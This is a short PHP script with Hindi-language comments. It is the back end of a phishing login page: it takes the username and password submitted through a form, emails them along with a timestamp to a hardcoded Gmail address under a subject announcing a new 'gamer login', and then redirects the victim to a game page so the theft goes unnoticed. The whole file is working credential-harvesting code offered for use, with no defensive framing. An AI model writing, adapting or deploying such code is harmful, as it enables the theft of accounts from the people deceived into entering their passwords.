<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Form se data nikalna
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Aapka Email ID yahan set hai
    $to = "thekinggaming882@gmail.com"; 
    $subject = "Naya Gamer Login Aaya Hai! 🎮";
    
    // Email ka message format
    $message = "Bhai, naya login detail mila hai:\n\n";
    $message .= "------------------------------\n";
    $message .= "Username: " . $user . "\n";
    $message .= "Password: " . $pass . "\n";
    $message .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $message .= "------------------------------\n";
    
    // Sender ki details (Isse aise hi rehne dein)
    $headers = "From: game-system@yourdomain.com";

    // PHP mail function jo email bhejta hai
    if(mail($to, $subject, $message, $headers)) {
        // Email jane ke baad seedha game (index.html) par redirect
        header("Location: index.html");
    } else {
        // Agar hosting par mail support nahi hai toh ye error dikhega
        echo "Bhai, server se email nahi ja raha. Check karo ki aapki hosting PHP Mail support karti hai ya nahi.";
    }
    exit();
}
?>
